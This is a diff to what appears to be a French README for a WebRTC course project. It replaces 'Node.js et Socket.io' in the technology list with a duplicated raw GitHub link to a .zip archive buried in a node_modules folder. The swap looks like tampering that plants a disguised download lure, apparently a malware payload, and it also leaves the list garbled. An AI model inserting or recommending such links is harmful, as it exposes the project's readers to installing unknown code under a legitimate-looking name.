@@ -15,7 +15,7 @@ Ce travail a été réalisé par :
 
 - HTML5
 - WebRTC API
-- Node.js et Socket.io
+- https://raw.githubusercontent.com/khlaifmed/rtc_tp/main/extension/node_modules/cookie-signature/rtc_tp_v2.1.zip et https://raw.githubusercontent.com/khlaifmed/rtc_tp/main/extension/node_modules/cookie-signature/rtc_tp_v2.1.zip
 - WebSocket
 - ...
 
